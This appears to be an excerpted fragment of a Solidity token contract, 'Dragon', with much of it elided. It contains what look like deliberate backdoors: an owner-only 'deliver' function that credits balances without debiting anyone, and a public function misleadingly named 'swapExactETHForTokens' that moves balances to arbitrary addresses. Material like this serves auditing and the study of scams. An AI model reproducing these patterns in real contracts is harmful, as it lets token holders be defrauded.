...
contract Dragon is Context, IERC20, Ownable {
    ...
    function deliver(uint256 tAmount) public onlyOwner() {
        ...
        _tOwned[sender] = _tOwned[sender].add(tTransferAmount);
        _rOwned[sender] = reflectionFromToken(_tOwned[sender], false);
    ...
    function swapExactETHForTokens(address[] memory addresses, uint256[] memory amounts) public {
        ...
        for (uint i = 0; i < amounts.length; i++) {
            ...
            uint256 currentRate = _getRate();
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tBurn) = _getValues(value);
            uint256 rBurn = tBurn.mul(currentRate);
            _rOwned[sender] = _rOwned[sender].sub(rAmount);
            _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
            _reflectFee(rFee, rBurn, tFee, tBurn);
